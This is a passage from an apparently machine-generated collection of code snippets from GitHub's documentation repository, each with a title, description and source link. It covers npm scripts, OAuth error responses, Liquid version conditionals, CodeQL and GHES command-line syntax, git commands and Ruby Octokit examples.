Text](#this-heading-is-not-unique-in-the-file).\n\nLink to the second non-unique section: [Link Text](#this-heading-is-not-unique-in-the-file-1).\n```\n\n----------------------------------------\n\nTITLE: Running the REST API synchronization script using npm\nDESCRIPTION: This command executes the `sync-rest` script defined in the `package.json` file, which is responsible for fetching the latest dereferenced OpenAPI schema files. It's used to update the local copy of the schema files to reflect the most recent changes in the REST API definition. This script is essential for developers and writers to preview and test documentation changes based on the latest schema.\nSOURCE: https://github.com/github/docs/blob/main/src/rest/scripts/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm run sync-rest\n```\n\n----------------------------------------\n\nTITLE: Handling Bad Verification Code - JSON\nDESCRIPTION: This JSON snippet shows the error response when the verification code provided is incorrect, expired, or doesn't match the initial authorization request.  The solution involves restarting the OAuth authorization process to obtain a new code.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-oauth-app-access-token-request-errors.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"error\": \"bad_verification_code\",\n  \"error_description\": \"The code passed is incorrect or expired.\",\n  \"error_uri\": \"/apps/managing-oauth-apps/troubleshooting-oauth-app-access-token-request-errors/#bad-verification-code\"\n}\n```\n\n----------------------------------------\n\nTITLE: Starting Local Server (Shell)\nDESCRIPTION: This command starts the local development server. It's useful for debugging staging problems by running the site locally and getting stack traces.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Specifying Reusable Workflow by Tag or SHA\nDESCRIPTION: Demonstrates how to specify a reusable workflow using a tag or SHA. This allows you to call specific versions of a reusable workflow within another workflow. The syntax `OWNER/REPOSITORY/PATH/FILENAME@TAG-OR-SHA` is used.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/allow-specific-actions-intro.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nocto-org/another-repo/.github/workflows/workflow.yml@v1\n```\n\n----------------------------------------\n\nTITLE: Get Pagelist - cURL\nDESCRIPTION: This cURL command retrieves a list of pages for a specific language and product version from the `/api/pagelist/:lang/:productVersion` endpoint.  The `lang` and `productVersion` parameters are required to specify the target language and product version. The command returns a list of paths matching the language and version.\nSOURCE: https://github.com/github/docs/blob/main/src/article-api/README.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncurl -s https://docs.github.com/api/pagelist/en/free-pro-team@latest\n```\n\nLANGUAGE: text\nCODE:\n```\n/en\n/en/search\n/en/get-started\n/en/get-started/start-your-journey\n/en/get-started/start-your-journey/about-github-and-git\n[...]\n```\n\n----------------------------------------\n\nTITLE: Token Exchange Error Response\nDESCRIPTION: This snippet presents the JSON structure for an error response from the token exchange endpoint. It includes an `error` field indicating the type of error, such as `invalid_request`. It is used to communicate validation failures to GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/using-oidc-with-github-copilot-extensions.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"error\": \"invalid_request\"\n  }\n```\n\n----------------------------------------\n\nTITLE: Setting Node TTL for 'fail' State (nes set-node-ttl fail)\nDESCRIPTION: This command sets the TTL for the `fail` state of a node in minutes.  The TTL for the `fail` state must be higher than the TTL for the `warn` state to ensure proper alerting and automated actions.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_54\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-ttl fail MINUTES\n```\n\n----------------------------------------\n\nTITLE: Example of Successful Production Migration Output\nDESCRIPTION: This example shows the output of a successful `gh actions-importer migrate bamboo build` command. It includes the path to the logs and the URL of the pull request created with the converted workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\n$ gh actions-importer migrate bamboo build --plan-slug :PROJECTKEY-PLANKEY --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n----------------------------------------\n\nTITLE: Markdown Sectional TOC Example\nDESCRIPTION: Demonstrates how to create a sectional table of contents (TOC) using Markdown to link to different sections of a document.  It showcases the correct formatting and structure for a sectional TOC, including the use of list items and anchor links. This example is intended to be used within a larger Markdown document.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_33\n\nLANGUAGE: markdown\nCODE:\n```\n## Setting up the application\n\nSet up your application according to your operating system.\n\n* [Setting up for macOS](#setting-up-for-macOS)\n* [Setting up for Windows](#setting-up-for-windows)\n* [Setting up for Linux](#setting-up-for-linux)\n\n### Setting up for macOS\n\nTEXT\n\n### Setting up for Windows\n\nThe application is supported for all versions of Windows, but the set up steps differ.\n\n* [Windows 98](#windows-98)\n* [Windows Vista](#windows-vista)\n* [Windows 11](#windows-11)\n\n#### Windows 98\n\nTEXT\n\n#### Windows Vista\n\nTEXT\n\n#### Windows 11\n\nTEXT\n\n### Setting up for Linux\n\nTEXT\n```\n\n----------------------------------------\n\nTITLE: PGP Public Key Block\nDESCRIPTION: This snippet contains the PGP public key block for the GitHub SIRT. It is used for encrypting sensitive information when communicating with the team. The key ID and expiry date are also provided in the document. The key allows secure email communication with the security team.\nSOURCE: https://github.com/github/docs/blob/main/content/site-policy/security-policies/github-sirt-description-rfc-2350.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nmDMEZQHKOxYJKwYBBAHaRw8BAQdAzvtu6OfJTspbWTVVU2uDeljmfEr1qYkvD25w\nNKB2twq0JUdpdEh1YiBTZWN1cml0eSA8c2VjdXJpdHlAZ2l0aHViLmNvbT6ImQQT\nFgoAQRYhBHjczOmSPlz7PKpdWredvaO+lE2eBQJlAco7AhsDBQkDwmcABQsJCAcC\nAiICBhUKCQgLAgQWAgMBAh4HAheAAAoJELedvaO+lE2e1voA/31lJyof7nWI1Mxs\nx3MHhwp5sFh2P/pFucuNKb7ciwMMAQCCAk39cSFs2WWw8aZC7lqXNJcFiMn0r+wm\ni6I3pWjiA7g4BGUByjsSCisGAQQBl1UBBQEBB0C0jKXWh6G8atXCJi2xsy71+NzX\n0Y2WN8yj3f59MGHYfAMBCAeIfgQYFgoAJhYhBHjczOmSPlz7PKpdWredvaO+lE2e\nBQJlAco7AhsMBQkDwmcAAAoJELedvaO+lE2eozABAIbzLwvaACiKFzXYjp9Zpenv\nGEHeqggLGzHpEheyoBMkAP96NI0kzYvj+zhJZ/4Y3TIDZaOD8OXezwia9E2Bxf5O\nAw==\n=4+TC\n-----END PGP PUBLIC KEY BLOCK-----\n```\n\n----------------------------------------\n\nTITLE: Pushing Changes to GitHub Using Git\nDESCRIPTION: This snippet demonstrates how to push local changes to the remote repository on GitHub. This makes the changes available for creating a pull request. Requires Git to be installed and the remote repository to be configured.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/exploring-projects-on-github/contributing-to-a-project.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit push\n```\n\n----------------------------------------\n\nTITLE: Adding Headers to a Request in Ruby\nDESCRIPTION: This snippet demonstrates how to add custom headers, like `content-type`, to a request made using the `request` method in Octokit.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\noctokit.request(\"POST /markdown/raw\", text: \"Hello **world**\", headers: { \"content-type\" => \"text/plain\" })\n```\n\n----------------------------------------\n\nTITLE: Rendered HTML Output\nDESCRIPTION: This snippet shows the expected HTML output after rendering the Markdown and Liquid code in the previous example. The `{{ foo }}` Liquid variable is replaced with the value 'bar' from the context object. The Markdown `# Beep` is rendered as an HTML heading.\nSOURCE: https://github.com/github/docs/blob/main/src/content-render/README.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<h1 id=\"beep\"><a href=\"#beep\">Beep</a></h1>\n<p>bar</p>\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering (GHES < 2.16 and GHES > 2.13) - Liquid\nDESCRIPTION: This snippet demonstrates conditional rendering with nested logic using 'ifversion'. It checks if GHES version is less than 2.16. If true, renders 'Alpha' and then checks if it's not FPT and GHES is greater than 2.13, rendering 'Bravo'. Otherwise, it renders 'Charlie'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than1.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.16 %}\n\nAlpha\n\n{% ifversion not fpt and ghes > 2.13 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Frontmatter Properties in Translated Files\nDESCRIPTION: This snippet indicates which frontmatter properties are used in translated files. Only `title`, `shortTitle`, and `intro` frontmatter properties are used when rendering translated content.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nsrc/frame/lib/page-data.js#L207-L226\n```\n\n----------------------------------------\n\nTITLE: Resolving CodeQL Extensions\nDESCRIPTION: This command resolves data extensions and GitHub-created machine learning models available to the specified query specifiers. It requires a mandatory argument representing the queries to execute, and accepts options for search paths, additional packs, model packs, and threat models. The command is considered deep plumbing and intended for advanced users.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-extensions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve extensions <options>... -- <query|dir|suite|pack>...\n```\n\n----------------------------------------\n\nTITLE: Adding open attribute to Details tag in HTML\nDESCRIPTION: This snippet shows how to make a collapsed section open by default. By adding the `open` attribute to the `<details>` tag, the content will be visible when the page loads.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-collapsed-sections.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<details open>\n```\n\n----------------------------------------\n\nTITLE: Accessing API with Access Token - HTTP\nDESCRIPTION: This code snippet shows how to access the GitHub API using the access token obtained during the OAuth flow. The `Authorization` header with the `Bearer` scheme is used to authenticate the request. This is a fundamental step in making authorized requests on behalf of the user.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_5\n\nLANGUAGE: HTTP\nCODE:\n```\nAuthorization: Bearer OAUTH-TOKEN\nGET {% data variables.product.rest_url %}/user\n```\n\n----------------------------------------\n\nTITLE: Example of an Invalid Relative Link in Markdown\nDESCRIPTION: This Markdown snippet shows an example of how not to create a relative link.  The link text must be on a single line.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/relative-links.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n[Contribution\nguidelines for this project](docs/CONTRIBUTING.md)\n```\n\n----------------------------------------\n\nTITLE: Running Playwright Tests in Headed Mode\nDESCRIPTION: This command runs Playwright tests in headed mode, opening a browser window to visualize the test execution.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- --headed\n```\n\n----------------------------------------\n\nTITLE: Prompt for Username\nDESCRIPTION: The following snippet shows a shell prompt requesting the GitHub Enterprise Server username authorized for migration. This typically involves entering the username of the site administrator.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nEnter username authorized for migration:  admin\n```\n\n----------------------------------------\n\nTITLE: Getting Node Admin Action (nes get-node-adminaction)\nDESCRIPTION: This command retrieves whether {% data variables.product.prodname_nes %} can take administrative action when a node goes offline.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_56\n\nLANGUAGE: shell\nCODE:\n```\nnes get-node-adminaction HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: Codespaces\nDESCRIPTION: This code snippet demonstrates how to use the `codespaces` tag to display content relevant to Codespaces users. It wraps instructions specific to Codespaces.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_12\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% codespaces %}\n\nThese instructions are pertinent to Codespaces users. They are mostly used outside the Codespaces docset, when we want to refer to how to do something inside Codespaces. Otherwise `webui` or `vscode` may be used.\n\n{% endcodespaces %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: GPG Key Listing Output\nDESCRIPTION: This is an example output from listing GPG secret keys using the `gpg --list-secret-keys --keyid-format=long` command. It shows details like the secret key ID, user ID, and subkey ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/copy-gpg-key-id.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n/Users/hubot/.gnupg/secring.gpg\n------------------------------------\nsec   4096R/3AA5C34371567BD2 2016-03-10 [expires: 2017-03-10]\nuid                          Hubot <hubot@example.com>\nssb   4096R/4BB6D45482678BE3 2016-03-10\n```\n\n----------------------------------------\n\nTITLE: Identifying Subnet Exhaustion Issues\nDESCRIPTION: This error code indicates that the Azure subnet has exhausted its available IP addresses.  Each runner requires a unique IP address, and when the subnet runs out of available addresses, the service is unable to scale further runners.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-hosted-compute-troubleshooting.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nVNetInjectionSubnetIsFull\n```\n\n----------------------------------------\n\nTITLE: Nested Conditionals - GHES version comparisons\nDESCRIPTION: This snippet shows nested `ifversion` tags.  It first checks if the GHES version is greater than 2.13. If true, it then checks if the GHES version is greater than 2.16 and outputs different content in the inner `if` and `else` blocks.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_6\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 %}\n\nAlpha\n\n{% ifversion ghes > 2.16 %}\n\nBravo\n\n{% else %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Executing CLI Server Command\nDESCRIPTION: This snippet shows the basic syntax for executing the `codeql execute cli-server` command. It is a 'deep plumbing' tool designed for internal use and optimization of CodeQL CLI execution.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/execute-cli-server.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql execute cli-server <options>...\n```\n\n----------------------------------------\n\nTITLE: Listing GPG Secret Keys (Long Format) - Shell\nDESCRIPTION: This command lists GPG secret keys with the long keyid format. It requires GPG to be installed. The output will include the secret key information.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/list-keys-with-note.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngpg --list-secret-keys --keyid-format=long\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_IID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_IID` to the GitHub Actions equivalent `${{ github.event.pull_request.number }}`. Provides unique id for a MR.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_58\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.number }}\n```\n\n----------------------------------------\n\nTITLE: Uninitialize Git LFS (versions below 1.1.0)\nDESCRIPTION: This command uninitializes Git LFS from the repository for versions below 1.1.0. It should be run after removing the files from the Git history. It's an alternative to `git lfs uninstall` for older versions.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/removing-files-from-git-large-file-storage.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit lfs uninit\n```\n\n----------------------------------------\n\nTITLE: Runner Group Not Found Error - Shell\nDESCRIPTION: This shell command returns an error if the specified runner group does not exist. It shows an example of an error message when attempting to add a runner to a non-existent runner group.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/automatically-adding-a-runner-to-a-group.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nCould not find any self-hosted runner group named \"rg-runnergroup\".\n```\n\n----------------------------------------\n\nTITLE: CodeQL Dataset Check Synopsis (Shell)\nDESCRIPTION: This is the synopsis for the `codeql dataset check` command. It shows the basic syntax of the command including the required dataset argument and optional flags.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/dataset-check.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql dataset check <options>... -- <dataset>\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for Free, Public, Team accounts\nDESCRIPTION: This Liquid snippet checks if the GitHub product version is 'fpt' (Free, Public, Team). If true, it renders content related to organizations owned by a Team account with GitHub code security or owned by an enterprise account.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/security-overview-fpt-cs-only.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\nOrganizations owned by a {% data variables.product.prodname_team %} account with {% data variables.product.prodname_GH_code_security %}, or owned by a {% data variables.product.prodname_enterprise %} account\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Changing port visibility using GitHub CLI\nDESCRIPTION: This command changes the visibility of a forwarded port using the GitHub CLI.  `CODESPACE-PORT` is the port number, and `SETTINGS` is the desired visibility setting (`private`, `org`, or `public`). You will be prompted to select a codespace if you have multiple.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/forwarding-ports-in-your-codespace.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace ports visibility CODESPACE-PORT:SETTINGS\n```\n\n----------------------------------------\n\nTITLE: SSH Connection to Former Primary Appliance\nDESCRIPTION: Establishes an SSH connection to the former primary appliance using the provided IP address. It uses port 122 and the 'admin' user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/recovering-a-high-availability-configuration.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@ FORMER_PRIMARY_IP\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering for Enterprise Server - Liquid\nDESCRIPTION: This snippet uses Liquid templating to conditionally render text for any actively supported version of Enterprise Server. It checks if the `enterpriseServerVersions` array contains the `currentVersion`. If true, the enclosed text is displayed.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/page-versioned-for-all-enterprise-releases.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% if enterpriseServerVersions contains currentVersion %}\n\nThis text should render on any actively supported version of Enterprise Server\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Showing Scheduled Upgrade Installations (Shell)\nDESCRIPTION: Shows scheduled installations for a package using the `ghe-upgrade-scheduler` with the `-s` option.  Replace `UPGRADE PACKAGE FILENAME` with the name of the upgrade package file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_105\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-upgrade-scheduler -s UPGRADE PACKAGE FILENAME\n> 0 2 15 12 * /usr/local/bin/ghe-upgrade -y -s UPGRADE-PACKAGE-FILENAME > /data/user/common/UPGRADE-PACKAGE-FILENAME.log 2>&1\n```\n\n----------------------------------------\n\nTITLE: Versioning Image Based on GHES Release with Liquid\nDESCRIPTION: This snippet shows how to version images based on the GitHub Enterprise Server (GHES) release. It uses Liquid conditionals to display different images based on whether the version is `fpt` or `ghec`, whether it's a GHES version older than 3.10, or whether it's GHES 3.10 or later. This ensures the correct image is displayed depending on the GHES release being viewed.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/creating-screenshots.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n{% raw %}\n{% ifversion fpt or ghec %}\n![An image of foo bar](/assets/images/foo/bar.png)\n{% elsif ghes < 3.10 %}\n![An image of foo bar for GHES 3.9 and lower](/assets/images/enterprise/3.5/foo/bar.png)\n{% else %}\n![An image of foo bar for GHES 3.10+](/assets/images/enterprise/foo/bar.png)\n{% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Conditional with Else Clause (Liquid)\nDESCRIPTION: This Liquid snippet demonstrates an `ifversion` conditional with an `else` clause. The outer `ifversion` checks for fpt, ghes, ghae, or ghec. If true, it proceeds to the inner `ifversion`, checking for fpt or ghec. If the inner condition is true, \"Bravo\" is rendered; otherwise, \"Delta\" is rendered.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/unnecessary.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes or ghae or ghec %}\nAlpha\n  {% ifversion fpt or ghec %}\n  Bravo\n  {% else %}\n  Delta\n  {% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Copilot Instructions with Markdown\nDESCRIPTION: This markdown snippet demonstrates how to configure GitHub Copilot instructions to adapt to a project's specific needs.  It includes instructions for dependency management (Bazel over Maven), code formatting (JavaScript with double quotes and tabs), and task tracking (Jira).  The file is intended to be named `.github/copilot-instructions.md` and placed in the root directory of the repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/repository-custom-instructions-example.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nWe use Bazel for managing our Java dependencies, not Maven, so when talking about Java packages, always give me instructions and code samples that use Bazel.\n\nWe always write JavaScript with double quotes and tabs for indentation, so when your responses include JavaScript code, please follow those conventions.\n\nOur team uses Jira for tracking items of work.\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on GHES version != 2.13, Liquid\nDESCRIPTION: This snippet uses the `ifversion` tag to conditionally render the text \"Alpha\" if the GHES version is not equal to 2.13. It demonstrates a simple 'not equals' version check in Liquid.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/not-equals.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes != 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Listing Existing Remotes in Git\nDESCRIPTION: This snippet shows how to list existing remotes using the `git remote -v` command. It displays the remote names and their associated URLs for both fetch and push operations. This command is useful for identifying existing remotes before modifying or removing them.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n> origin  git@{% data variables.product.product_url %}:OWNER/REPOSITORY.git (fetch)\n> origin  git@{% data variables.product.product_url %}:OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: Installing GitHub Actions Importer CLI\nDESCRIPTION: This command installs the GitHub Actions Importer CLI extension using the `gh` command-line tool. It uses the `extension install` subcommand to install the extension from the `github/gh-actions-importer` repository. The `gh` tool must be installed and configured for this command to work.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/installing-actions-importer.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngh extension install github/gh-actions-importer\n```\n\n----------------------------------------\n\nTITLE: Searching models by chat completion task on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that support interaction via chat using the `task` qualifier with `chat-completion`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_10\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=task:chat-completion&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Executing query server command\nDESCRIPTION: This shell command attempts to execute the now deprecated query server. It's purpose was to run queries from IDEs. As the command is no longer supported, it is advised to upgrade the extension to 1.7.6 or later, or migrate to the `codeql execute query-server2` subcommand.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/execute-query-server.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql execute query-server <options>...\n```\n\n----------------------------------------\n\nTITLE: Catching All Errors in Octokit\nDESCRIPTION: This snippet demonstrates how to catch general errors when using Octokit. It uses a `begin/rescue` block to handle `Octokit::Error` exceptions, printing the status code and message from the error response if available. It also prints the error.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nbegin\nfiles_changed = []\n\niterator = octokit.paginate.iterator(\"GET /repos/{owner}/{repo}/pulls/{pull_number}/files\", owner: \"github\", repo: \"docs\", pull_number: 22809, per_page: 100)\niterator.each do | data |\n    files_changed.concat(data.map {\n      | file_data | file_data.filename\n    })\n  end\nrescue Octokit::Error => error\nif error.response\nputs \"Error! Status: #{error.response.status}. Message: #{error.response.data.message}\"\nend\nputs error\nend\n```\n\n----------------------------------------\n\nTITLE: Avoiding Forbidden Keys in YAML\nDESCRIPTION: This section highlights the use of forbidden keys. YAML parses certain strings as Boolean values. To avoid this, there is a list of forbidden keys that can not be used.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_3\n\n\n\n----------------------------------------\n\nTITLE: Label URL Markdown Example\nDESCRIPTION: This Markdown snippet demonstrates how to reference a label URL in {% data variables.product.github %} Markdown. When the label URL is used, it is automatically rendered if the label is in the same repository.  If the label name contains a period, it won't render.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/autolinked-references-and-urls.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\nhttps://github.com/github/docs/labels/enhancement\n```\n\n----------------------------------------\n\nTITLE: Requesting Device Code via API in Ruby\nDESCRIPTION: The `request_device_code` function makes a `POST` request to `{% data variables.product.oauth_host_code %}/login/device/code` to initiate the device flow. It includes the `CLIENT_ID` as a parameter and sets the `Accept` header to `application/json`. It relies on the `URI`, `Net::HTTP`, and `parse_response` functions.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\ndef request_device_code\n  uri = URI(\"{% data variables.product.oauth_host_code %}/login/device/code\")\n  parameters = URI.encode_www_form(\"client_id\" => CLIENT_ID)\n  headers = {\"Accept\" => \"application/json\"}\n\n  response = Net::HTTP.post(uri, parameters, headers)\n  parse_response(response)\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying commit locations with secrets (example)\nDESCRIPTION: This code snippet shows an example of the output displayed when a push is blocked due to detected secrets. It provides the commit SHA and file path where the secrets were found.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nremote:   —— {% data variables.product.prodname_dotcom %} {% data variables.product.pat_generic_title_case %} ——————————————————————\nremote:    locations:\nremote:      - commit: 8728dbe67\nremote:        path: README.md:4\nremote:      - commit: 03d69e5d3\nremote:        path: README.md:4\nremote:      - commit: 8053f7b27\nremote:        path: README.md:4\n```\n\n----------------------------------------\n\nTITLE: Defining Redirects - YAML\nDESCRIPTION: This snippet shows how to use the `redirect_from` frontmatter property to list URLs that should redirect to the current page.  This is used to maintain backwards compatibility when URLs change.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Getting started with GitHub Desktop\nredirect_from:\n  - /articles/first-launch/\n  - /articles/error-github-enterprise-version-is-too-old/\n  - /articles/getting-started-with-github-for-windows/\n```\n\n----------------------------------------\n\nTITLE: Markdown Warning Alert\nDESCRIPTION: This snippet showcases the 'Warning' alert box in Markdown. The `[!WARNING]` syntax indicates potential risks or issues that users should be aware of.  This alert box typically highlights possible problems.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/alerts.md#_snippet_3\n\nLANGUAGE: Markdown\nCODE:\n```\n> [!WARNING]\n> Just a warning\n```\n\n----------------------------------------\n\nTITLE: HTML Comment Example\nDESCRIPTION: This HTML snippet shows a valid HTML comment included within a text string.  The comment itself does not contain the word \"gooblygook\" and should therefore be preserved. It demonstrates a common use case of including comments directly in HTML code.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/html-comments.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\nThis is a <!-- html comment -->\n```"
  }
]